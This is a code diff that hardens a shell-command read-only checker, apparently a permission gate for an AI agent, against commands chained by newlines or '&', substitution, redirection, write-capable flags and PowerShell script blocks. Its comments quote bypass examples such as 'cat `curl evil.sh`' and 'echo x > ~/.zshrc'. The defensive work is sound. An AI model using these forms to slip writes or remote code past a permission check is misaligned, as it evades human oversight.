@@ -7,7 +7,15 @@ export type { ShellType } from './shell-provider.js'
 
 /** Split compound shell commands by pipe/chain operators for permission checking */
 export function splitShellCommands(cmd: string): string[] {
-  // Split by |, &&, ;, || — but not inside quotes or curly braces.
+  // Split by |, &&, ;, ||, newlines and background `&` — but not inside
+  // quotes or curly braces.
+  //
+  // Newline and single `&` are real statement separators in POSIX shells
+  // and PowerShell: `ls\nrm x` and `ls & rm x` both execute `rm`, so a
+  // splitter that ignores them lets a multi-line command smuggle a write
+  // past the read-only check under a whitelisted leading token. The `&`
+  // split skips `>&` / `&>` (fd duplication / combined redirect) so
+  // `cmd 2>&1 | grep x` keeps its shape.
   //
   // Brace tracking exists to keep PowerShell hash literals / script blocks
   // intact: `Select-Object @{N='Directory';E={$_.Name}},Count` has a `;`
@@ -26,6 +34,7 @@ export function splitShellCommands(cmd: string): string[] {
   for (let i = 0; i < cmd.length; i++) {
     const ch = cmd[i]
     const next = cmd[i + 1]
+    const prev = cmd[i - 1]
 
     if (ch === "'" && !inDoubleQuote) {
       inSingleQuote = !inSingleQuote
@@ -53,7 +62,10 @@ export function splitShellCommands(cmd: string): string[] {
       } else if (ch === '|') {
         parts.push(current)
         current = ''
-      } else if (ch === ';') {
+      } else if (ch === ';' || ch === '\n' || ch === '\r') {
+        parts.push(current)
+        current = ''
+      } else if (ch === '&' && prev !== '>' && next !== '>') {
         parts.push(current)
         current = ''
       } else {
@@ -302,9 +314,114 @@ function isReadOnlyControlFlow(cmd: string): boolean {
   return found > 0
 }
 
+/** Quote/escape-aware scan for shell syntax that turns a read-only-looking
+ *  command into a write or an arbitrary execution:
+ *    - output redirection:  `echo x > ~/.zshrc`, `grep pat f > out`
+ *    - command substitution: `echo $(rm x)`, ``cat `curl evil.sh` ``
+ *    - process substitution: `cat <(curl evil.sh)`
+ *  Fd duplication (`2>&1`, `>&-`) and the null sinks (`/dev/null`, `$null`,
+ *  `NUL`) are not writes and stay allowed. Single quotes suppress
+ *  substitution; double quotes do not; backslash escapes the next char
+ *  outside single quotes. */
+function hasUnsafeShellSyntax(cmd: string): boolean {
+  let inSingle = false
+  let inDouble = false
+  for (let i = 0; i < cmd.length; i++) {
+    const ch = cmd[i]
+    if (ch === '\\' && !inSingle) {
+      i++
+      continue
+    }
+    if (ch === "'" && !inDouble) {
+      inSingle = !inSingle
+      continue
+    }
+    if (ch === '"' && !inSingle) {
+      inDouble = !inDouble
+      continue
+    }
+    if (inSingle) continue
+    if (ch === '`') return true
+    if ((ch === '$' || ch === '<') && cmd[i + 1] === '(') return true
+    if (ch !== '>' || inDouble) continue
+    // Redirect: `>` / `>>` plus optional `&`, then the target. `>&2` /
+    // `2>&1` / `>&-` are fd duplication, not file writes — those require
+    // the `&`; a bare `> 2` writes a file literally named `2`.
+    let j = i + 1
+    if (cmd[j] === '>') j++
+    const hadAmp = cmd[j] === '&'
+    if (hadAmp) j++
+    while (cmd[j] === ' ' || cmd[j] === '\t') j++
+    const target = cmd.slice(j)
+    if (hadAmp && (target === '' || /^[\d-]/.test(target))) continue
+    if (target === '') continue
+    if (/^\/dev\/null\b/.test(target)) continue
+    if (/^\$null\b/i.test(target)) continue
+    if (/^nul\b/i.test(target)) continue
+    return true
+  }
+  return false
+}
+
+/** Commands on the read-only list that become writers with specific flags. */
+const WRITE_FLAG_RULES: Array<{ cmd: RegExp; flag: RegExp }> = [
+  // find -delete / -exec rm … / -fprintf file … turn the canonical "safe"
+  // search tool into a delete/exec/write vector.
+  { cmd: /^\s*find\b/i, flag: /^-(delete|exec|execdir|ok|okdir|fprint|fprintf|fls)$/i },
+  { cmd: /^\s*sort\b/i, flag: /^(-o|--output)/i }, // sort -o out overwrites
+  { cmd: /^\s*tree\b/i, flag: /^(-o|--output)/i }, // tree -o out writes
+  { cmd: /^\s*Tee-Object\b/i, flag: /^-f/i }, // -FilePath (any unambiguous abbreviation)
+  { cmd: /^\s*git\s+(diff|log|show)\b/i, flag: /^--output/i }, // git diff --output=patch writes
+]
+
+/** Whitelisted leading commands whose arguments can still write or execute. */
+function hasWriteFlags(cmd: string): boolean {
+  const tokens = cmd.split(/\s+/).filter(Boolean)
+  for (const rule of WRITE_FLAG_RULES) {
+    if (!rule.cmd.test(cmd)) continue
+    if (tokens.some((t) => rule.flag.test(t))) return true
+  }
+  // `env` with a trailing command runs it: `env rm file`, `env bash -c …`.
+  // Flags and VAR=val assignments are still the harmless printing form.
+  if (/^\s*env\b/i.test(cmd)) {
+    for (let i = 1; i < tokens.length; i++) {
+      const t = tokens[i]!
+      if (t === '--') return i + 1 < tokens.length
+      if (t.startsWith('-')) {
+        // Value-taking forms consume the following token.
+        if (t === '-u' || t === '--unset' || t === '-C' || t === '--chdir' || t === '-S' || t === '--split-string') i++
+        continue
+      }
+      if (/^[A-Za-z_]\w*=/.test(t)) continue // VAR=val assignment
+      return true // first bare word = command to execute
+    }
+  }
+  return false
+}
+
+/** Scan a segment that passed the leading-token check for a PowerShell
+ *  script block (`{ … }`) smuggling a non-readonly cmdlet or an arbitrary
+ *  invocation: `ForEach-Object { Remove-Item $_ }` leads with a whitelisted
+ *  cmdlet but the body runs whatever it wants. Property-access blocks like
+ *  `Where-Object { $_.Length -gt 100 }` contain no cmdlet tokens and stay
+ *  allowed. */
+function hasUnsafeScriptBlock(c: string): boolean {
+  if (!c.includes('{')) return false
+  if (PS_CALL_OP_RE.test(c) || PS_DOT_SOURCING_RE.test(c)) return true
+  for (const match of c.matchAll(VERB_NOUN_FIND_RE)) {
+    const name = match[0]
+    if (!VERB_NOUN_STRICT_RE.test(name)) continue
+    if (!READ_ONLY_CMDLET_SET.has(name.toLowerCase())) return true
+  }
+  return false
+}
+
 /** Check if a sub-command is read-only (safe to auto-allow) */
 export function isReadOnly(cmd: string): boolean {
   const c = cmd.trim()
+  if (hasUnsafeShellSyntax(c)) return false
+  if (hasWriteFlags(c)) return false
+  if (hasUnsafeScriptBlock(c)) return false
   if (READ_ONLY_REGEX.test(c)) return true
   if (READ_ONLY_GIT_BRANCH_RE.test(c)) return true
   if (TSC_COMMAND_RE.test(c) && TSC_READ_ONLY_FLAG_RE.test(c) && !TSC_WRITE_FLAG_RE.test(c)) return true
